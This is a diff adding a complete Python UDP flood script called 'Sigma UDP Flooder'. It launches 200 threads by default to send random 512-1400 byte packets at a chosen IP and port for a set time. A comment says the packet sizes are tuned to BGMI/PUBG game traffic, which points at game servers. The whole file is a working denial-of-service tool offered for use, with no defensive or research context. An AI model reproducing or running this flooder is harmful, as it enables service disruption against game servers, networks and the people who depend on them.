@@ -1,0 +1,66 @@
+#!/usr/bin/env python3
+# Sigma UDP Flooder — sigma binary
+import socket
+import sys
+import time
+import random
+import threading
+import os
+
+def flood(ip, port, duration):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+    except:
+        pass
+    end_time = time.time() + duration
+    while time.time() < end_time:
+        try:
+            # BGMI/PUBG UDP packet size range (512-1400 bytes, MTU safe)
+            size = random.randint(512, 1400)
+            payload = random.randbytes(size)
+            sock.sendto(payload, (ip, port))
+        except:
+            pass
+    sock.close()
+
+def main():
+    if len(sys.argv) < 4:
+        print(f"Usage: python3 {sys.argv[0]} <ip> <port> <duration> [threads]")
+        sys.exit(1)
+
+    ip       = sys.argv[1]
+    port     = int(sys.argv[2])
+    duration = int(sys.argv[3])
+    threads  = int(sys.argv[4]) if len(sys.argv) > 4 else 200
+
+    print(f"[*] Target   : {ip}:{port}")
+    print(f"[*] Duration : {duration}s")
+    print(f"[*] Threads  : {threads}")
+    print(f"[*] Protocol : UDP")
+
+    workers = []
+    for i in range(threads):
+        t = threading.Thread(
+            target=flood,
+            args=(ip, port, duration),
+            daemon=True
+        )
+        t.start()
+        workers.append(t)
+
+    # Progress ticker
+    start = time.time()
+    while time.time() - start < duration:
+        elapsed = int(time.time() - start)
+        remaining = duration - elapsed
+        print(f"\r[~] {elapsed}s / {duration}s — {remaining}s remaining", end="", flush=True)
+        time.sleep(1)
+
+    for t in workers:
+        t.join(timeout=2)
+
+    print(f"\n[+] Attack complete — {ip}:{port} — {duration}s")
+
+if __name__ == "__main__":
+    main()
